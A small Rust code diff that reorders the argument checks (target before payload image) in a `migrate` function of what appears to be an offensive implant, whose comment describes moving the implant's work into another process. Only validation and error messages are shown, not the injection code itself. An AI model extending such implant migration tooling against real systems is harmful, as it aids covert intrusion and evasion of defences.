@@ -105,13 +105,16 @@ pub fn plan_from_args(args: &Value) -> Plan {
 
 /// Move the work of the implant into another process.
 pub fn migrate(plan: &Plan) -> Result<Report, String> {
-    if plan.payload.is_empty() {
-        return Err("migrate: the migration needs an image to move".to_string());
-    }
+    // The target first: a plan with no destination has nowhere to put an
+    // image, so that is the thing to tell the operator about when neither
+    // was given.
     if plan.program.is_empty() && plan.pid == 0 {
         return Err(
             "migrate: the migration needs a target (args.pid or args.spawn)".to_string(),
         );
+    }
+    if plan.payload.is_empty() {
+        return Err("migrate: the migration needs an image to move".to_string());
     }
     migrate_inner(plan)
 }
